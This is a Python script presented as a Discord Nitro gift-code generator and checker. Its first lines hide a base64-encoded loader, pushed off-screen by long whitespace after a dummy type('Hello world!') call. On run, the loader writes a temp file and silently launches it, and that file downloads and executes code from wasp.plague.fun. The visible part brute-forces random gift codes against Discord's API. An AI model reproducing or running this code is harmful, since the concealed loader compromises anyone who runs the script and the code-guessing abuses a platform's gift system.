from builtins import *
type('Hello world!')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9tVGJLdTZFMEpwcW9ZM2tvJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
from builtins import *
type('Hello world!')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9tVGJLdTZFMEpwcW9ZM2tvJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
import time
import os
import colorama


time.sleep(3)
os.system('cls' if os.name == 'nt' else 'clear')

import random
import string
import ctypes

try:
    from discord_webhook import DiscordWebhook
except ImportError: 
    input(f"Module discord_webhook not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install discord_webhook'\nPress enter to exit") # Tell the user it has not been installed and how to install it
    exit()
try:
    import requests
except ImportError:
    input(f"Module requests not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install requests'\nPress enter to exit")# Tell the user it has not been installed and how to install it
    exit() 


class NitroGen: 
    def __init__(self):
        self.fileName = "Nitro Codes.txt"

    def main(self):
        os.system('cls' if os.name == 'nt' else 'clear') 
        if os.name == "nt": 
            print("")
            ctypes.windll.kernel32.SetConsoleTitleW("Nitro Gen & Checker by boom#2345") 
        else: 
            print(f'\33]0;Nitro Gen & Checker by boom#2345\a', end='', flush=True) 

        print("""Created by boom#2345""")
        time.sleep(2)
        self.slowType("A simple Discord Nitro generator & checker", .01) 
        time.sleep(1) 
        self.slowType("\nInput How Many Codes to Generate and Check: ", .01, newLine = False) 

        num = int(input(''))

        self.slowType("\nDo you wish to use a discord webhook? \nIf so type it here or press enter to ignore: ", .01, newLine = False)
        url = input('') 
        webhook = url if url != "" else None

    

        valid = [] 
        invalid = 0

        for i in range(num):
            try:
                code = "".join(random.choices(
                    string.ascii_uppercase + string.digits + string.ascii_lowercase,
                    k = 16
                ))
                url = f"https://discord.gift/{code}" 

                result = self.quickChecker(url, webhook) 

                if result: #
                    valid.append(url) 
                else:
                    invalid += 1 
            except Exception as e: 
                print(f" Error | {url} ") 

            if os.name == "nt": 
                ctypes.windll.kernel32.SetConsoleTitleW(f"Nitro Generator and Checker - {len(valid)} Valid | {invalid} Invalid - by boom#2345") 
                print("")
            else:
                print(f'\33]0;Nitro Generator and Checker - {len(valid)} Valid | {invalid} Invalid - by boom#2345\a', end='', flush=True) 

        print(f"""
Results:
 Valid > {len(valid)}
 Invalid > {invalid}
 Valid Codes > {', '.join(valid )}""")

        input("\nThe end! Press Enter 5 times to close the program.")
        [input(i) for i in range(4,0,-1)]

    def slowType(self, text, speed, newLine = True): 
        for i in text:
            print(i, end = "", flush = True) 
            time.sleep(speed)
        if newLine: 
            print()

    def generator(self, amount): 
        with open(self.fileName, "w", encoding="utf-8") as file:
            print("Wait, Generating for you") 

            start = time.time() 

            for i in range(amount):
                code = "".join(random.choices(
                    string.ascii_uppercase + string.digits + string.ascii_lowercase,
                    k = 16
                )) 

                file.write(f"https://discord.gift/{code}\n")

            
            print(f"Genned {amount} codes | Time taken: {round(time.time() - start, 5)}s\n") #

    def fileChecker(self, notify = None):
        valid = []
        invalid = 0 
        with open(self.fileName, "r", encoding="utf-8") as file:
            for line in file.readlines():
                nitro = line.strip("\n")

                url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"

                response = requests.get(url) 

                if response.status_code == 200: 
                    print(f" Valid | {nitro} ")
                    valid.append(nitro) 

                    if notify is not None:
                        DiscordWebhook(
                            url = notify,
                            content = f"Valid Nitro Code! @everyone \n{nitro}"
                        ).execute()
                    else: 
                        break 

                else: 
                    print(f" Invalid | {nitro} ") 
                    invalid += 1 

        return {"valid" : valid, "invalid" : invalid}

    def quickChecker(self, nitro, notify = None):
        url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"
        response = requests.get(url)

        if response.status_code == 200:
            print(f" Valid > {nitro} ", flush=True, end="" if os.name == 'nt' else "\n")
            with open("Nitro Codes.txt", "w") as file: 
                file.write(nitro)

            if notify is not None: 
                DiscordWebhook(
                    url = notify,
                    content = f"Valid Nitro Code! @everyone \n{nitro}"
                ).execute()

            return True

        else: 
            print(f" Invalid > {nitro} ", flush=True, end="" if os.name == 'nt' else "\n") 
            return False 

if __name__ == '__main__':
    Gen = NitroGen() 
    Gen.main()